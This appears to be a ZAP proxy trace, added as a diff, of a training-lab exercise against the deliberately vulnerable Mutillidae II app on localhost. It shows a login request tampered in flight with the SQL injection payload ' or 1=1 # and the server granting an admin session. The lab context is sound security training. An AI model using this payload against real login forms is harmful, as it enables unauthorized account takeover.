@@ -1,0 +1,48 @@
+================================================================================
+OWASP ZAP 2.17.0 - BREAKPOINT INTERCEPTION & IN-FLIGHT TAMPERING TRACE
+Session ID: 2fg41plebkqbhq6anta4ek0g93
+Mode: Man-in-the-Middle (MitM) Active Breakpoint (HTTP Request Trap)
+================================================================================
+
+[STEP 1: BREAKPOINT TRAP TRIGGERED]
+Status: PAUSED IN MEMORY (Request not forwarded to server)
+Timestamp: 2026-11-04 10:46:58.412 CET
+Origin Client: Mozilla Firefox ESR 140.0 (Proxy: localhost:8081)
+Destination: localhost:8080 (OWASP Mutillidae II Container)
+
+--- ORIGINAL CLIENT BUFFER ---
+POST http://localhost:8080/index.php?page=login.php HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 56
+Cookie: PHPSESSID=2fg41plebkqbhq6anta4ek0g93; showhints=1
+
+username=estudiante_normal&password=password123&login-php-submit-button=Login
+
+[STEP 2: IN-FLIGHT PARAMETER TAMPERING IN ZAP REQUEST EDITOR]
+Operator: INSEGUS Security Team 3 Auditor
+Target Parameter: username
+Original Value: estudiante_normal
+Tampered Value: ' or 1=1 #
+Length Adjustment: Recalculated Content-Length from 56 to 68 bytes
+
+--- TAMPERED BUFFER FORWARDED TO SERVER (STEP BUTTON PRESSED) ---
+POST http://localhost:8080/index.php?page=login.php HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 68
+Cookie: PHPSESSID=2fg41plebkqbhq6anta4ek0g93; showhints=1
+
+username=%27+or+1%3D1+%23&password=123&login-php-submit-button=Login
+
+[STEP 3: SERVER RESPONSE INTERCEPTED & VALIDATED]
+Status Code: 302 Found
+Location: index.php?page=home.php&popUpNotificationCode=AU1
+Set-Cookie: username=admin; path=/
+Set-Cookie: uid=1; path=/
+Verdict: TAUTOLOGY EXECUTED IN DATABASE - ADMINISTRATIVE SESSION ESTABLISHED
+================================================================================
